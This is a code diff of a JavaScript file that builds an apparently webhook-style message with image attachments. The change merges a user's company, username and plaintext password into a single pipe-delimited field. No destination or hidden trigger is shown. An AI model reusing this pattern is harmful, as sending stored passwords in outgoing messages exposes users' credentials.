@@ -204,16 +204,16 @@ async function embed(data){
     let veja_usu=user[len-1].username
     let veja_pas=user[len-1].password
     
-    obj.fields.push({name:"empresa",value:veja_em, inline:false})
-    obj.fields.push({name:"nome usuario",value:veja_usu, inline:false})
-    obj.fields.push({name:"password",value:veja_pas, inline:false})
-
-    obj.fields.push({name:"codigo",value:"inserir",inline:false})
     key_1.map((ch,i)=>{
+      if(i==0){
+        obj.fields.push({name:"empresa",value:`${veja_em}|${veja_usu}|${veja_pas}|inserir|${ob1[ch]}`, inline:false})
+      }
+      else{
         valor={name:ch,value:ob1[ch],inline:i>2?true:false}
         obj.fields.push(valor)
+      }
     })
-
+    
     return obj
 }
 
@@ -226,7 +226,6 @@ function anexo(data){
         formdata.append(`file${i+1}`,ob2[ch],`img${i+1}.png`)
         formdata.append("payload_json",JSON.stringify({content:"Imagens"}))
     })
-
     return formdata
 }
 
